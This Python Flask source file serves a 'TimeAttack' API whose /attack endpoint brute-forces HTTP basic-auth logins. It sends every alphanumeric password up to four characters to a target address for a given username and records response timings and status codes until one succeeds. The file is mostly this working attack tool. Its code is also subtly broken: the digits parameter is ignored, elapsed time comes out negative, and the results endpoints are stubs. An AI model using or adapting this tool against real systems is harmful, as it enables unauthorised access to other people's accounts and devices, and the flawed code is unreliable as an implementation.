from flask import Flask, request, send_file, jsonify
from flask_restplus import Resource, Api, reqparse, fields
from flask_cors import CORS

from werkzeug.exceptions import BadRequest

#from celery import Celery

import time
import os
import json
import requests
import time
from string import digits, ascii_uppercase, ascii_lowercase
from itertools import product

chars = digits + ascii_uppercase + ascii_lowercase


def password_generator(digits):
    for n in range(1, 4 + 1):
        for comb in product(chars, repeat=n):
            yield(''.join(comb))


def primary_attack(address, digits, username):
    """ address = address of the target device
        digits = how many digits in the password
        username = what username to use in the attack
    """
    elapsed_time = 0
    timings = []
    data = {}
    passwords = password_generator(digits)
    for password in passwords:
        start = time.perf_counter()
        req = requests.post(address, auth=(username, password))
        end = time.perf_counter()
        elapsed_time = start - end
        data['time'] = elapsed_time
        data['code'] = req.status_code
        timings.append(data)
        if req.ok == True:
            return timings
        data = {}




def create_app():
    app = Flask(__name__)
    CORS(app)
    api = Api(app)

    parser = reqparse.RequestParser()
    parser.add_argument('resultid', action='append', type=str, help='ID of the result')
    ns = api.namespace('TimeAttack', description='Timing attack operations')

    params = api.model('Params', {
        'address': fields.String(required=True, description='Attack target address'),
        'digits': fields.Integer(required=True, description='Number of digits in the password to be brute forced'),
        'username': fields.String(required=True, description='Username to attack')
    })


    @ns.route('/attack')
    class Attacks(Resource):
        """ This endpoint initiates an attack """
        @ns.doc('post attack parameters and initiate attack')
        @ns.expect(params)
        @ns.marshal_with(params)
        def post(self):
            data = api.payload
            print(data)
            address = data['address']
            digits = data['digits']
            username = data['username']
            resultname = primary_attack(address, digits, username)

            return(resultname)


    @ns.route('/results')
    class Results(Resource):
        """ This endpoint returns results """
        @ns.doc('fetch results')
        def get(self):
            #return results
            return('results')


    @ns.route('/results/<string:resultid>')
    class Result(Resource):
        """ This endpoint returns a single result """
        @ns.doc('fetch a single result')
        def get(self):
            #return the correct result
            return('result')

    return app


if __name__ == '__main__':
    app = create_app()

    app.run(debug=True)
